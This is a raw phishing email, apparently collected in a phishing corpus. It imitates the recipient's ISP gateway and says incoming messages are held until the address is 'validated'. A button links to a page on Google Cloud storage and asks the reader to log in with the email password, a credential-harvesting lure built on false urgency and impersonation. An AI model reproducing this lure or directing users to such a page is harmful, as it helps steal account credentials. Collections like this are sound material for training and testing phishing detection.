@@ -1,0 +1,124 @@
+Return-Path: postmaster@mailsrv.email
+Delivered-To: jose@monkey.org
+X-FDA: 78888288066.44.BC8C36F
+Received: from srv4.mailsrv.email (srv4.mailsrv.email [198.12.83.76])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 2A751800C416
+	for <jose@monkey.org>; Mon,  6 Dec 2021 19:01:33 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=mailsrv.email;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=postmaster@mailsrv.email; bh=UOwHwIPaxLKFVmpCfz+P6Uj98so8JLXdGY8otkBcYdA=; 
+ =?utf-8?q?b=3DTvAfTFZrjcW/nnXcYQCgtkbr/bOEzj/xJnbqqhkQCuEgJeVNEPc4d/G9SGOkA?=
+ =?utf-8?q?MmM7OrjdnHzbfqF?=  
+ jfkdGcxkx9TCOQp4TKS/3MMa4cMCdg9okDBkSz24qrhLUcolx++GqbSHg+g7cmxdbVSlERqpCrTy
+   ubZsLNLRV1OvFgT+vhA=
+From: "monkey.org" <postmaster@mailsrv.email>
+To: jose@monkey.org
+Subject: 13  Messages Pending 
+Date: 06 Dec 2021 20:01:29 +0100
+Message-ID: <20211206200129.4E6869A69D8325BE@mailsrv.email>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_707CD1F9.25560271"
+X-Stat-Signature: 399kxf6735au7a66xec18574qfo78xcy
+Authentication-Results: imf16.b.hostedemail.com;	dkim=pass
+ header.d=mailsrv.email header.s=dkim header.b=TvAfTFZr;	dmarc=pass
+ (policy=reject) header.from=mailsrv.email;	spf=pass (imf16.b.hostedemail.com:
+ domain of postmaster@mailsrv.email designates 198.12.83.76 as permitted
+ sender) smtp.mailfrom=postmaster@mailsrv.email
+X-Spam-Status: No, score=-1.33
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 2A751800C416
+X-HE-Tag: 1638817293-138054
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 97
+
+
+------=_NextPart_000_0012_707CD1F9.25560271
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+test
+------=_NextPart_000_0012_707CD1F9.25560271
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<title>New Page 1</title>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19355"></head>
+<body>
+<div style=3D"margin: 30px 0px 0px; padding: 0px; border: 0px currentColor;=
+ color: rgb(32, 31, 30); text-transform: none; text-indent: 0px; letter-spa=
+cing: normal; font-family: Verdana, Geneva, sans-serif, serif, EmojiFont; f=
+ont-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; ve=
+rtical-align: baseline; white-space: normal; orphans: 2; widows: 2; font-st=
+retch: inherit; background-color: rgb(255, 255, 255); -webkit-font-smoothin=
+g: antialiased; font-variant-ligatures: normal;=20
+font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east=
+-asian: inherit; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial;">=
+
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;">To, jose=
+@monkey.org</p>
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;">Your inc=
+oming=20
+messages are now queued up and pending delivery,<br style=3D"-webkit-font-s=
+moothing: antialiased;">
+because your address has not been validated by Gsuite and Office365 servers=
+=2E</p>
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;">You are =
+required to=20
+validate your address jose@monkey.org to restore normal inbox delivery.<br =
+style=3D"-webkit-font-smoothing: antialiased;">&nbsp;</p>
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;"><font co=
+lor=3D"#0000ff"><strong>
+____________________________________________________</strong></font></p>
+<table width=3D"39%" height=3D"60" align=3D"center" id=3D"table2" bgcolor=
+=3D"#045fb4">
+<tbody>
+<tr>
+<td>
+<div align=3D"center"><a style=3D"text-decoration: none;" href=3D"https://s=
+torage.cloud.google.com/maintainancecomponeta.appspot.com/fcocguygendom.htm=
+l#jose@monkey.org" target=3D"_blank"><font color=3D"#ffffff" face=3D"calibr=
+i" size=3D"+2">
+	Validate jose@monkey.org Now </font></a></div></td></tr></tbody></table>
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;">&nbsp;&n=
+bsp;Please note:<br><br>
+Login with your eMail jose@monkey.org Password <br>to validate, be sure to =
+do so in=20
+a Secure Manner.<br><br>Once validated your Email Delivery system would be=
+=20
+working<br>in Less Than 2 Hours.<br><br>Sincerely,<br>monkey.org ISP Gatewa=
+y.</p>
+<p align=3D"center" style=3D"-webkit-font-smoothing: antialiased;"><br styl=
+e=3D"-webkit-font-smoothing: antialiased;">
+______________________________________________________________________</p><=
+/div>
+<div style=3D"margin: 10px 0px 0px; padding: 0px; border: 0px currentColor;=
+ color: rgb(131, 130, 130); text-transform: none; line-height: 2; text-inde=
+nt: 0px; letter-spacing: normal; font-family: Verdana, Geneva, sans-serif, =
+serif, EmojiFont; font-size: 11px; font-style: normal; font-weight: 400; wo=
+rd-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2;=
+ widows: 2; font-stretch: inherit; background-color: rgb(255, 255, 255); -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial;">
+<p align=3D"center"><em style=3D"-webkit-font-smoothing: antialiased;">This=
+ is a=20
+mandatory service communication for jose@monkey.org.</em>
+ &nbsp;| If you no longer wish to receive this email&nbsp;<a style=3D"margi=
+n: 0px; padding: 0px; border: 0px currentColor; vertical-align: baseline; -=
+webkit-font-smoothing: antialiased;" href=3D"mailto:unsubscribe@monkey.org"=
+ target=3D"_blank" rel=3D"noreferrer noopener" data-auth=3D"NotApplicable">=
+Unsubscribe</a></p></div></body></html>
+------=_NextPart_000_0012_707CD1F9.25560271--
+
